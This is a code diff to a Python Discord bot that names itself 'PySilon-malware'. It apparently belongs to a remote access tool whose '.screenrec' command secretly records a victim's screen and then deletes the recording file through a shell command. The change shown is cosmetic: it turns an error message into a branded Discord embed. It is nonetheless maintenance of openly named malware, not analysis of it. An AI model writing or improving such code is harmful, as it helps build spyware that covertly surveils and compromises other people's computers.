@@ -33,4 +33,7 @@ elif message.content == '.screenrec':
         subprocess.run(f'del {output_file}', shell=True)
 
     except Exception as e:
-        await message.channel.send("An error occurred during screen recording.")
+        embed = discord.Embed(title="📛 Error",description="An error occurred during screen recording.", colour=discord.Colour.red())
+        embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
+        
+        await message.channel.send(embed=embed)
